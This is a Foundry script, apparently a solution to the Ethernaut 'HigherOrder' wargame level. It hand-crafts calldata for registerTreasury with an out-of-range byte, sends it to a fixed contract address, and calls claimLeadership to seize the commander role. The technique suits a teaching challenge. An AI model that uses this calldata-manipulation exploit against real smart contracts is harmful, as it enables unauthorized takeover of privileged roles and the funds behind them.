// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/30_HigherOrder.sol";

contract POC is Script {
    HigherOrder public target;
    event info(bytes data);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = HigherOrder(0x76941A457C69a34f12CB42aD58Bb487edE422441);

        bytes memory payload = abi.encodeWithSignature("registerTreasury(uint8)", uint8(42));
        payload[5] = hex"FF";
        emit info(payload);
        // console.log(payload.length);

        address commander_addr = target.commander();
        console.log("before commander: ", commander_addr);

        address(target).call(payload);
        target.claimLeadership();

        commander_addr = target.commander();
        console.log("after commander: ", commander_addr);

        vm.stopBroadcast();
    }
}